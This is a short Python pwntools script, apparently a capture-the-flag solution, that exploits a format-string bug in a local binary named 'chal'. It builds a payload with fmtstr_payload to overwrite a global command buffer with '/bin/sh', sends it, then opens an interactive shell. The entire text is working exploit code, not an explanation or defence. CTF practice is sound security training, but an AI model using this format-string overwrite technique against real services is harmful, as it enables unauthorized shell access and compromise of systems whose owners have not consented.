from pwn import *
from ctflib.pwn import *

e = ELF("./chal")
context.binary = e
def setup():
    return e.process()
p = setup()
pl = fmtstr_payload(6, {e.sym.cmd: b"/bin/sh"},numbwritten=4)
print(e.sym.cmd)
print(len(pl), pl)
p.sendline(pl)
#gdb.attach(p)
p.sendline(b"quit")
p.interactive()